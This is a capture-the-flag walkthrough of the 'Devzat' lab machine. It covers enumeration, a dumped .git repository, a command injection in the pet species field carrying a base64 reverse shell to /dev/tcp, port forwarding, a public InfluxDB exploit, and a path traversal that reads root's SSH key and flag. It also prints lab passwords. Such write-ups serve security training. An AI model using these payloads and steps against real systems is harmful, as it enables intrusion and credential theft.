## Enumeration

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://devzat.htb/
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.91%I=7%D=10/18%Time=616D0F58%P=x86_64-pc-linux-gnu%r(N
SF:ULL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see that 80 port will redirect us to "devzat.htb", so add the domain name to our /etc/hosts file.

## Web

The website advertises "devzat" a chat application and right at the bottom of the page we can find a way to interact with the chat service `ssh -l [username] devzat.htb -p 8000`. We try to connect to it and we see that we have a limited number of commands that don't lead anywhere. 

After that let's try to discover any vhosts on the domain. 

```bash
gobuster vhost -u http://devzat.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -r -t 80
```
Discovered "pets.devzat.htb". Let's add this to /etc/hosts and navigate in our browser.
This time it's an inventory and down at the bottom of the page we find "Add a pet" functionality with two fields "Name the pet" and "Which species is it". The latter is selection menu but the former is a regular text field that we can try for injection.

Now after submitting some special characters we only get an "exit-status-1" response.
Let's investigate this further. We try fuzzing.

```bash
wfuzz -u http://pets.devzat.htb/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt -c --hh 510 -t 80
```
```bash
000000021:   301        2 L      3 W        40 Ch       "css"
000001767:   301        2 L      3 W        42 Ch       "build"
000004659:   403        9 L      28 W       280 Ch      "server-status"
000005919:   301        2 L      3 W        41 Ch       ".git"  
```

We got something here, the ".git" directory seems interesting so let's dump it using "git-dumper"

```bash
git_dumper.py http://pets.devzat.htb/.git dump/
```
We get the source code of the pets application. After poking around the code of the main.go we come across a vulnerable "exec" function that directly executes the species name without any input sanitazation. 

```bash
cmd := exec.Command("sh", "-c", "cat characteristics/"+species)$
```
We can leverage this and input a reverse shell. First let's capture the submit request in burp. Now create the payload (better encoded it):

```bash
echo -n "bash -i >& /dev/tcp/IP/PORT 0>&1" | base64
```
In burp
```bash
{
    "name":"Anonymous",
    "species":"dog;echo <base64-hash> | base64 -d | bash"
}
```
Open the listener and send the request to get the callback.

## Filesystem

Now we got a limited shell as patrick but we know ssh is open so let's grab patrick's private key and connect through ssh.

Now let's run LinPEAS.

And we see a service running on port 8086. Let's make a port forward on that port 
```bash
ssh -L 8000:127.0.0.1:8086 -i id_rsa patrick@10.10.14.116
# Now browse localhost:8000
```

Alternatively we can use chisel:
```bash
# Local machine
./chisel server -p 8080 --reverse
# Remote machine
./chisel client 10.10.14.116:8080 R:8086:127.0.0.1:8086
# Now browse localhost:8086
```
After accessing that port on browser it's said "404 page not found" and we see it's using php with laravel framework. After enumerating the service with nmap `nmap -A 127.0.0.1 -p 8086` we find that it's running InfluxDB.

With a quick google search we are able to find an exploit [here](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933).

## Exploitation

Running the exploit we disclose a "devzat" database and from there we dump the data from the "user" table `SELECT * FROM "user"`.

Now we have the "catherine" user password "woBeeYareedahc7Oogeephies7Aiseci", so let's su to this account.

## Privilege Escalation

Again running linpeas we find two backup files devzat-main & devzat-dev. Python is installed on the system so let's download these locally and analyze them.

Now unzip the two files and look inside we get pretty much the same files. So let's use `diff command` for changes inside the files. What we get is `commands.go`. Alternatevely to diff we can use online tools like [Text-Compare](https://text-compare.com/). 

Now comparing the two `commands.go` files we find some differences. First change we see "path/filepath" in "import". Second it's a new command called "/file" and for using that we need password which is hard-coded inside the program and we also see that if the path is not found, the current path will get printed.

`password = CeilingCatStillAThingIn2021?`

And inside "devchat.go" file we see it's running on port 8443.

Back to catherine's shell connect to the service:
```bash
ssh -l user localhost -p 8443
```
If we input a wrong path it's printing the current path /root/devzat. 

```bash
/file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
/file ../root.txt CeilingCatStillAThingIn2021?
```

